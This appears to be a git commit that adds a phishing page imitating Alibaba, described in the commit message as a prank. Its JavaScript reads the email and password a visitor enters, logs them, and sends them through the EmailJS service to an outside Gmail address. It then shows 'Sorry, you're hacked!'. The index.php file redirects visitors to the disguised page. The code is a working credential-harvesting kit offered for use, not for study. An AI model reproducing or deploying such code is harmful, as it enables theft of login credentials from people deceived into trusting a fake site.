9a194cd7948a76602bd613632df01e8064c3d5ad
bobstottts <bobstottts@googlemail.com>
2017-06-22 19:36:01 +0600

    Add files via upload
    Site looking like alibaba to prank users.

---
+++ index.php
@@ -0,0 +1,1 @@
+<?php header( 'Location: /F313CC3CD6D71A6A9F6117AF2F50EA3E.html' ) ;  ?>
---
+++ myScripts.js
@@ -0,0 +1,20 @@
+
+(function()
+{
+  console.log("Initiallizing email stuff");
+  emailjs.init("user_XYNdN92yHCWf97RSwemwg");
+})();
+
+function myFunction()
+{
+  console.log("Hi!");
+  var email = $('#email').val();
+  var passsword = $('#pass').val();
+
+  console.log(email);
+  console.log(passsword);
+
+  emailjs.send("gmail", "template_TV08CQI3", {"reply_to":"bobstottts@gmail.com
+","from_name": email,"message_html":passsword});
+  alert("Sorry, you're hacked!");
+}
